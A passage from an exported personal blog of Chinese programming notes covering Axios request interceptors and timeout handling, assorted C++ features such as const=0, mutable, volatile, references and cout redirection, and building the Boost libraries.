<li>从 node.js 创建 http 请求</li>
<li>支持 Promise API</li>
<li>拦截请求和响应</li>
<li>转换请求数据和响应数据</li>
<li>取消请求</li>
<li>自动转换 JSON 数据</li>
<li>客户端支持防御 XSRF</li>
</ul>
<p>下面介绍使用Axios的拦截功能实现Axios超时错误的统一处理。</p>
<h1 id="Axios基本用法"><a href="#Axios基本用法" class="headerlink" title="Axios基本用法"></a>Axios基本用法</h1><p>执行 GET 请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 为给定 ID 的 user 创建请求</span><br><span class="line">axios.get(&#39;&#x2F;user?ID&#x3D;12345&#39;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可选地，上面的请求可以这样做</span><br><span class="line">axios.get(&#39;&#x2F;user&#39;, &#123;</span><br><span class="line">    params: &#123;</span><br><span class="line">      ID: 12345</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>执行 POST 请求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">axios.post(&#39;&#x2F;user&#39;, &#123;</span><br><span class="line">    firstName: &#39;Fred&#39;,</span><br><span class="line">    lastName: &#39;Flintstone&#39;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>执行多个并发请求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getUserAccount() &#123;</span><br><span class="line">  return axios.get(&#39;&#x2F;user&#x2F;12345&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getUserPermissions() &#123;</span><br><span class="line">  return axios.get(&#39;&#x2F;user&#x2F;12345&#x2F;permissions&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">axios.all([getUserAccount(), getUserPermissions()])</span><br><span class="line">  .then(axios.spread(function (acct, perms) &#123;</span><br><span class="line">    &#x2F;&#x2F; 两个请求现在都执行完成</span><br><span class="line">  &#125;));</span><br></pre></td></tr></table></figure>

<h1 id="Axios拦截器"><a href="#Axios拦截器" class="headerlink" title="Axios拦截器"></a>Axios拦截器</h1><p>自定义 axios 实例添加拦截器，在请求或响应被 then 或 catch 处理前拦截它们。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; create an axios instance</span><br><span class="line">const service &#x3D; axios.create(&#123;</span><br><span class="line">  baseURL: process.env.VUE_APP_BASE_API, &#x2F;&#x2F; url &#x3D; base url + request url</span><br><span class="line">  &#x2F;&#x2F; withCredentials: true, &#x2F;&#x2F; send cookies when cross-domain requests</span><br><span class="line">  timeout: 5000 &#x2F;&#x2F; request timeout</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加请求拦截器</span><br><span class="line">service.interceptors.request.use(function (config) &#123;</span><br><span class="line">    &#x2F;&#x2F; 在发送请求之前做些什么</span><br><span class="line">    return config;</span><br><span class="line">  &#125;, function (error) &#123;</span><br><span class="line">    &#x2F;&#x2F; 对请求错误做些什么</span><br><span class="line">    return Promise.reject(error);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加响应拦截器</span><br><span class="line">service.interceptors.response.use(function (response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 对响应数据做点什么</span><br><span class="line">    return response;</span><br><span class="line">  &#125;, function (error) &#123;</span><br><span class="line">    &#x2F;&#x2F; 对响应错误做点什么</span><br><span class="line">    return Promise.reject(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<h1 id="拦截timeout错误"><a href="#拦截timeout错误" class="headerlink" title="拦截timeout错误"></a>拦截timeout错误</h1><p>在Axios响应拦截器中，处理timeout错误，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service.interceptors.response.use(function (response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 对响应数据做点什么</span><br><span class="line">    return response;</span><br><span class="line">  &#125;, function (error) &#123;</span><br><span class="line">    &#x2F;&#x2F; 对响应错误做点什么</span><br><span class="line">    if(error.message.includes(&#39;timeout&#39;))&#123;   &#x2F;&#x2F; 判断请求异常信息中是否含有超时timeout字符串</span><br><span class="line">      console.log(&quot;错误回调&quot;, error);</span><br><span class="line">      alert(&quot;网络超时&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return Promise.reject(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.kancloud.cn/yunye/axios/234845" target="_blank" rel="noopener">Axios使用说明</a>,by yunye.</li>
<li><a href="https://www.cnblogs.com/hcxy/p/10052465.html" target="_blank" rel="noopener">axios超时timeout拦截</a>,by 亲爱的混蛋.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus不常用语法解析</title>
    <url>/2020/01/21/CPlusPlus%E4%B8%8D%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>近年来C++发展很快，出现了一些新的语法和特性。熟练掌握这些语法和特性，可提高编写C++代码的效率。下面即简要介绍这些C++语法和特性。</p>
<h1 id="const-0"><a href="#const-0" class="headerlink" title="const=0"></a>const=0</h1><p>在类声明中，会出现const=0语法，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Weapon</span><br><span class="line">&#123;</span><br><span class="line">  public:</span><br><span class="line">    virtual void attack() const &#x3D; 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在此处 =0 说明该类成员函数是一个纯虚函数。而将const放在成员函数之后，表示该成员函数禁止修改该类的数据成员(mutable成员除外)。如果您无意中修改了该类的数据成员，编译器会报告一个错误。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.codenong.com/21187965/" target="_blank" rel="noopener">关于virtual：c ++：const = 0的方法原型的代码说明</a>,by 码农家园.</li>
<li><a href="https://blog.csdn.net/kenden23/article/details/15500485" target="_blank" rel="noopener">C++构造函数和析构函数的调用顺序</a>,by 靖心.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中Cout输出到文件</title>
    <url>/2019/12/12/CPlusPlus%E4%B8%ADCout%E8%BE%93%E5%87%BA%E5%88%B0%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>最近在调试一个C++程序时，没有报任何错误就直接退出了，Cout输出到控制台的信息没法查看，无法找到错误原因。于是想到将Cout输出重定向到文件，以便分析错误原因。具体代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    streambuf *psbuf,*backup;</span><br><span class="line">    ofstream file;</span><br><span class="line">    file.open(&quot;test.txt&quot;);</span><br><span class="line">    backup&#x3D;cout.rdbuf();</span><br><span class="line">    psbuf&#x3D;file.rdbuf();</span><br><span class="line"></span><br><span class="line">    cout.rdbuf(psbuf);&#x2F;&#x2F;将cout输出重定向到文件</span><br><span class="line">    cout&lt;&lt; &quot;This will write to test.txt!&quot;;</span><br><span class="line"></span><br><span class="line">    cout.rdbuf(backup);&#x2F;&#x2F;恢复cout输出重定向到终端</span><br><span class="line">    file.close();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/fly1988happy/archive/2012/04/16/2452021.html" target="_blank" rel="noopener">NULL指针、零指针、野指针</a>,by fly1988happy.</li>
<li><a href="https://www.w3cschool.cn/cpp/cpp-null-pointers.html" target="_blank" rel="noopener">C++ Null 指针</a>,by w3cschool.</li>
<li><a href="https://stackoverflow.com/questions/10150468/how-to-redirect-cin-and-cout-to-files" target="_blank" rel="noopener">How to redirect cin and cout to files?</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之Lambda表达式</title>
    <url>/2021/11/20/CPlusPlus%E4%B9%8BLambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/DswCnblog/p/5629165.html" target="_blank" rel="noopener">C++ 11 Lambda表达式</a>,by 滴水瓦.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之Boost入门</title>
    <url>/2021/11/01/CPlusPlus%E4%B9%8BBoost%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>Boost C++ 库（Libraries）是一组扩展C++功能的经过同行评审（Peer-reviewed）且开放源码程序库。大多数的函数为了能够以开放源码或者封闭项目的方式运作，而许可于Boost软件许可协议（Boost Software License）之下。许多Boost的开发人员是来自C++标准委员会，而部分的Boost库成为C++的TR1标准之一。</p>
<p>为了要确保库的效率与弹性，Boost广泛的使用模板（template）功能。而它是针对各式领域的C++用户与应用领域（Application Domain）上，包含的库类别从像smart_ptr 库（页面存档备份，存于互联网档案馆）这种类通用库，到像是文件系统的操作系统抽象层，甚至能够利用Boost来开发额外的库或是给高级的C++用户利用，像是MPL。</p>
<h1 id="源代码下载"><a href="#源代码下载" class="headerlink" title="源代码下载"></a>源代码下载</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;boostorg&#x2F;boost.git</span><br><span class="line">git submodule --update</span><br></pre></td></tr></table></figure>

<h1 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h1><p>生成编译工具b2.exe：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd %BOOST_ROOT%</span><br><span class="line">bootstrap.bat</span><br></pre></td></tr></table></figure>

<ul>
<li>完整安装boost</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b2 --buildtype&#x3D;complete</span><br></pre></td></tr></table></figure>

<ul>
<li>定制安装boost</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 可查看所有必须编译才能使用的库</span><br><span class="line">b2 --show-libraries</span><br><span class="line"># 单独编译安装regex库：</span><br><span class="line">b2 --with-regex link&#x3D;static runtime-link&#x3D;shared threading&#x3D;multi –-stagedir&#x3D;build stage</span><br><span class="line"># 生成include文件夹</span><br><span class="line">b2 --with-regex link&#x3D;static runtime-link&#x3D;shared threading&#x3D;multi --prefix&#x3D;build install</span><br></pre></td></tr></table></figure>

<p>编译结果在stage\lib目录下生成regex库(Debug/Release)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libboost_regex-vc100-mt-1_77.lib</span><br><span class="line">libboost_regex-vc100-mt-gd-1_77.lib</span><br></pre></td></tr></table></figure>

<p>相关参数的含义：<br>stage 仅创建和安装库文件(不创建头文件),可以用 –stagedir= 选项指定库的安装位置，默认安装在当前目录下的stage文件夹内。<br>–with- 创建和安装指定的库，如果使用了这个选项，则仅仅指定的库被创建，其它库不被创建。如果不指定这个选项，默认创建所有需要编译安装的库。<br>link=static指定生成静态regex库<br>threading=multi指定生成多线程库<br>runtime-link=shared指定动态链接C和C++ 运行库</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/85806857" target="_blank" rel="noopener">Boost编译与使用</a>,by luckyum.</li>
<li><a href="https://stackoverflow.com/questions/865668/parsing-command-line-arguments-in-c" target="_blank" rel="noopener">Parsing Command Line Arguments in C++?</a>,by stackoverflow.</li>
<li><a href="https://www.boost.org/doc/libs/1_75_0/doc/html/program_options.html" target="_blank" rel="noopener">Boost.Program_options</a>,by Boost.</li>
<li><a href="https://www.boost.org/doc/libs/1_75_0/libs/json/doc/html/index.html" target="_blank" rel="noopener">Boost.JSON</a>,by Boost.</li>
<li><a href="https://zh.wikipedia.org/wiki/Boost_C%2B%2B_Libraries" target="_blank" rel="noopener">Boost C++ Libraries</a>,by wikipedia.</li>
<li><a href="https://www.boost.org/doc/libs/1_75_0/more/getting_started/windows.html" target="_blank" rel="noopener">Boost Getting Started on Windows</a>,by Boost.</li>
<li><a href="https://www.jianshu.com/p/908c962aaf80" target="_blank" rel="noopener">Windows平台下boost库的编译和调用</a>,by JasonLiThirty.</li>
<li><a href="https://www.cnblogs.com/cmranger/p/4759223.html" target="_blank" rel="noopener">windows下编译和安装boost库</a>,by rangers.</li>
<li><a href="https://www.cnblogs.com/cmranger/p/4653396.html" target="_blank" rel="noopener">C++静态库与动态库</a>,by rangers.</li>
<li><a href="https://blog.csdn.net/morning_color/article/details/50241987" target="_blank" rel="noopener">boost::program_options 用法详解</a>,by morning_color.</li>
<li><a href="https://www.miaoerduo.com/2018/06/22/the-usage-of-cpp-boost-json/" target="_blank" rel="noopener">C++ Boost JSON解析库的使用</a>,by miaoerduo.</li>
<li><a href="https://blog.51cto.com/u_15127588/4202592" target="_blank" rel="noopener">boost.xml_parser中文字符问题</a>,by mob604756f44f2a .</li>
<li><a href="https://stackoverflow.com/questions/2114466/creating-json-arrays-in-boost-using-property-trees" target="_blank" rel="noopener">Creating JSON arrays in Boost using Property Trees</a>,by stackoverflow.</li>
<li><a href="https://www.cnblogs.com/ink19/p/Boost_JSON.html" target="_blank" rel="noopener">Boost.JSON Boost的JSON解析库（1.75首发）</a>,by ink19.</li>
<li><a href="https://www.coder.work/article/831796" target="_blank" rel="noopener">c++ - 如何使用 json 解析器的 boost property_tree 创建空数组节点</a>,by coder.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之mutable关键字</title>
    <url>/2021/12/22/CPlusPlus%E4%B9%8Bmutable%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    <content><![CDATA[<p>在 C++ 中，mutable 是为了突破 const 的限制而设置的。被 mutable 修饰的变量，将永远处于可变的状态，即使在一个 const 函数中，甚至结构体变量或者类对象为 const，其 mutable 成员也可以被修改。</p>
<p>mutable的作用有两点：</p>
<ol>
<li>保持常量对象中大部分数据成员仍然是“只读”的情况下，实现对个别数据成员的修改；</li>
<li>使类的const函数可以修改对象的mutable数据成员。</li>
</ol>
<p>使用mutable的注意事项：</p>
<ol>
<li>mutable只能作用于类的非静态和非常量数据成员。</li>
<li>在一个类中，应尽量或者不用mutable，大量使用mutable表示程序设计存在缺陷。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/cl2010abc/article/details/80675137" target="_blank" rel="noopener">c++关键字mutable作用</a>,by 苍老流年.</li>
<li><a href="https://www.zhihu.com/question/64969053" target="_blank" rel="noopener">C++中mutable关键字存在的必要性是什么？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之Socket网络编程</title>
    <url>/2022/12/07/CPlusPlus%E4%B9%8BSocket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="inet-pton和inet-ntop"><a href="#inet-pton和inet-ntop" class="headerlink" title="inet_pton和inet_ntop"></a>inet_pton和inet_ntop</h1><p>这两个函数是随IPv6出现的函数，对于IPv4地址和IPv6地址都适用，函数中p和n分别代表表达（presentation)和数值（numeric)。地址的表达格式通常是ASCII字符串，数值格式则是存放到套接字地址结构的二进制值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;将点分十进制的ip地址转化为用于网络传输的数值格式</span><br><span class="line">&#x2F;&#x2F;返回值：若成功则为1，若输入不是有效的表达式则为0，若出错则为-1</span><br><span class="line">int inet_pton(int family, const char *strptr, void *addrptr);     </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;将数值格式转化为点分十进制的ip地址格式</span><br><span class="line">&#x2F;&#x2F;返回值：若成功则为指向结构的指针，若出错则为NULL </span><br><span class="line">const char * inet_ntop(int family, const void *addrptr, char *strptr, size_t len);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/10/26/CPlusPlus%E9%AB%98%E6%80%A7%E8%83%BD%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">C++高性能网络编程</a>,by huangwang.</li>
<li><a href="https://blog.csdn.net/zyy617532750/article/details/58595700" target="_blank" rel="noopener">inet_pton()和inet_ntop()函数详解</a>,by QvQ是惊喜不是哭泣.</li>
<li><a href="https://blog.csdn.net/weixin_45792025/article/details/118548799" target="_blank" rel="noopener">2021-07-07使用winsock2.h中函数还需要链接静态库ws2_32.lib</a>,by 杨晴朗Solo.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之从二进制文件中读取浮点数</title>
    <url>/2021/11/10/CPlusPlus%E4%B9%8B%E4%BB%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%B5%AE%E7%82%B9%E6%95%B0/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://stackoverflow.com/questions/19614581/reading-floating-numbers-from-bin-file-continuosly-and-outputting-in-console-win" target="_blank" rel="noopener">reading floating numbers from bin file continuosly and outputting in console window</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/iamzhangzhuping/article/details/50570951" target="_blank" rel="noopener">C++ memcpy()函数用法</a>,by iamzhangzhuping.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之引用符号&amp;的用法</title>
    <url>/2021/11/09/CPlusPlus%E4%B9%8B%E5%BC%95%E7%94%A8%E7%AC%A6%E5%8F%B7%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>符号&amp;在C语言中代表取址符，在C++中则代表引用，是C++引入的新语言特性，是C++常用的一个重要内容之一，正确、灵活地使用引用，可以使程序简洁、高效。</p>
<h1 id="引用简介"><a href="#引用简介" class="headerlink" title="引用简介"></a>引用简介</h1><p>引用就是某一变量（目标）的一个别名，对引用的操作与对变量直接操作完全一样。</p>
<p>引用的声明方法：类型标识符 &amp;引用名=目标变量名；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int a; int &amp;ra&#x3D;a; &#x2F;&#x2F;定义引用ra,它是变量a的引用，即别名</span><br></pre></td></tr></table></figure>

<h1 id="引用作为参数"><a href="#引用作为参数" class="headerlink" title="引用作为参数"></a>引用作为参数</h1><p>引用的一个重要作用就是作为函数的参数。以前的C语言中函数参数传递是值传递，如果有大块数据作为参数传递的时候，采用的方案往往是指针，因为这样可以避免将整块数据全部压栈，可以提高程序的效率。但是现在（C++中）又增加了一种同样有效率的选择（在某些特殊情况下又是必须的选择），就是引用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void swap(int &amp;p1, int &amp;p2) &#x2F;&#x2F;此处函数的形参p1, p2都是引用</span><br><span class="line">&#123; int p; p&#x3D;p1; p1&#x3D;p2; p2&#x3D;p; &#125;</span><br></pre></td></tr></table></figure>

<h1 id="引用作为返回值"><a href="#引用作为返回值" class="headerlink" title="引用作为返回值"></a>引用作为返回值</h1><p>要以引用返回函数值，则函数定义时要按以下格式：</p>
<p>类型标识符 &amp;函数名（形参列表及类型说明）<br>{函数体}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">float &amp;fn2(float r) &#x2F;&#x2F;定义函数fn2，它以引用方式返回函数值</span><br><span class="line">&#123;</span><br><span class="line">　temp&#x3D;(float)(r*r*3.14);</span><br><span class="line">　return temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>引用作为返回值，必须遵守以下规则：</p>
<ul>
<li>不能返回局部变量的引用。</li>
<li>不能返回函数内部new分配的内存的引用。</li>
<li>可以返回类成员的引用，但最好是const。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_40955914/article/details/80767404" target="_blank" rel="noopener">c++&amp;的用法</a>,by Knigh_art.</li>
<li><a href="https://liaohuming.com/2016/01/21/notes/20160121-%E6%88%91%E6%89%80%E7%90%86%E8%A7%A3%E7%9A%84C++%E7%B1%BB%E8%AE%BE%E8%AE%A1%E4%B8%ADprivate%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E5%92%8C%E8%BF%94%E5%9B%9Econst%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B/" target="_blank" rel="noopener">我所理解的C++类设计中private成员变量和返回const引用类型</a>,by Huming.</li>
<li><a href="https://www.cnblogs.com/tangmiao/p/11217657.html" target="_blank" rel="noopener">C++返回引用的需求</a>,by 唐淼.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之宏定义</title>
    <url>/2022/07/11/CPlusPlus%E4%B9%8B%E5%AE%8F%E5%AE%9A%E4%B9%89/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/fnlingnzb-learner/p/6903966.html" target="_blank" rel="noopener">C++宏定义详解</a>,by Boblim.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之volatile关键字</title>
    <url>/2021/12/22/CPlusPlus%E4%B9%8Bvolatile%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    <content><![CDATA[<p>C/C++ 中的 volatile 关键字和 const 对应，用来修饰变量，通常用于建立语言级别的 memory barrier。</p>
<p>volatile 关键字是一种类型修饰符，用它声明的类型变量表示可以被某些编译器未知的因素更改，比如：操作系统、硬件或者其它线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。声明时语法：int volatile vInt; 当要求使用 volatile 声明的变量的值的时候，系统总是重新从它所在的内存读取数据，即使它前面的指令刚刚从该处读取过数据。</p>
<p>当两个线程都要用到某一个变量且该变量的值会被改变时，应该用 volatile 声明，该关键字的作用是防止优化编译器把变量从内存装入 CPU 寄存器中。如果变量被装入寄存器，那么两个线程有可能一个使用内存中的变量，一个使用寄存器中的变量，这会造成程序的错误执行。volatile 的意思是让编译器每次操作该变量时一定要从内存中真正取出，而不是使用已经存在寄存器中的值。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.runoob.com/w3cnote/c-volatile-keyword.html" target="_blank" rel="noopener">C/C++ 中 volatile 关键字详解</a>,by runoob.</li>
<li><a href="https://blog.csdn.net/zhangliang1223/article/details/7614027?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore" target="_blank" rel="noopener">InterlockedCompareExchange用法详解</a>,by 漂泊心情.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus函数设计技巧</title>
    <url>/2021/11/15/CPlusPlus%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>在C++中，参数传递的方式是“实虚结合”。</p>
<ul>
<li>按值传递(pass by value)</li>
<li>地址传递(pass by pointer)</li>
<li>引用传递(pass by reference)</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://c.biancheng.net/cpp/html/486.html" target="_blank" rel="noopener">C语言函数设计的一般原则和技巧</a>,by C语言中文网.</li>
<li><a href="https://www.zhihu.com/question/31276547" target="_blank" rel="noopener">设计C++函数传参时如何决定使用指针还是引用？</a>,by zhihu.</li>
<li><a href="https://blog.csdn.net/ccblogger/article/details/77752659" target="_blank" rel="noopener">C++中函数调用时的三种参数传递方式详解</a>,by CC丶Z.</li>
<li><a href="https://nettee.github.io/posts/2018/What-happens-when-return-an-object-by-value-in-Cpp/" target="_blank" rel="noopener">C++ 函数可以直接返回一个对象吗？</a>,by nettee.</li>
<li><a href="https://www.yiibai.com/cplusplus/cpp_passing_arrays_to_functions.html" target="_blank" rel="noopener">数组作为函数参数</a>,by LiHongxi.</li>
<li><a href="http://c.biancheng.net/view/1404.html" target="_blank" rel="noopener">C++类对象作为函数参数传递详解</a>,by c语言中文网.</li>
<li><a href="http://c.biancheng.net/view/2251.html" target="_blank" rel="noopener">C++引用10分钟入门教程</a>,by c语言中文网.</li>
<li><a href="https://blog.csdn.net/nbaDWde/article/details/68180018" target="_blank" rel="noopener">C++中类成员对象与指针的区别</a>,by PengStrongLee.</li>
<li><a href="http://blog.sina.com.cn/s/blog_86186c970102yqpo.html" target="_blank" rel="noopener">C++中using的三种用法</a>,by 算法集市.</li>
<li><a href="https://blog.csdn.net/sinat_33924041/article/details/83621287" target="_blank" rel="noopener">10、【C++】前向声明/嵌套类/局部类（内部类）</a>,by 阿慕路泽.</li>
<li><a href="https://www.cnblogs.com/RioTian/p/15115387.html" target="_blank" rel="noopener">C++11 noexcept 关键字用法学习</a>,by CNBLOG.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之DLL分析</title>
    <url>/2022/09/21/CPlusPlus%E4%B9%8BDLL%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>使用vcpkg安装各类C++库很方便，但是在使用vcpkg安装osg、osgearth后，使用如下程序测试osg和osgearth，出现了一个小问题，3D模型不显示，说是找不到插件。</p>
<p>刚开始以为是vcpkg安装osg、osgearth出了问题，后面发现将vcpkg中编译生成的osg的plugin放到测试程序所在目录，发现能加载3D模型了，但是渲染纹理失败。</p>
<p>于是自己编译osg源码，发现测试程序能加载3D模型。最终结论是vcpkg编译安装osg了问题。此外，可参考<a href="https://blog.csdn.net/yasi_xi/article/details/39295843" target="_blank" rel="noopener">process explorer 查看句柄或者加载的dll</a>，分析测试程序加载的osg插件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;osgViewer&#x2F;Viewer&gt;</span><br><span class="line">#include &lt;osgDB&#x2F;ReadFile&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    osgViewer::Viewer viewer;</span><br><span class="line">    viewer.setSceneData(osgDB::readNodeFile(&quot;cow.osg&quot;));</span><br><span class="line">    return viewer.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/yasi_xi/article/details/39295843" target="_blank" rel="noopener">process explorer 查看句柄或者加载的dll</a>,by yasi_xi.</li>
<li><a href="https://blog.csdn.net/aoxuestudy/article/details/121529921" target="_blank" rel="noopener">osg程序中osgDB::writeNodeFile和osgDB::readNodeFile总是失败</a>,by 妙为.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus友元函数与友元类</title>
    <url>/2021/12/21/CPlusPlus%E5%8F%8B%E5%85%83%E5%87%BD%E6%95%B0%E4%B8%8E%E5%8F%8B%E5%85%83%E7%B1%BB/</url>
    <content><![CDATA[<p>私有成员只能在类的成员函数内部访问，如果想在别处访问对象的私有成员，只能通过类提供的接口（成员函数）间接地进行。这固然能够带来数据隐藏的好处，利于将来程序的扩充，但也会增加程序书写的麻烦。</p>
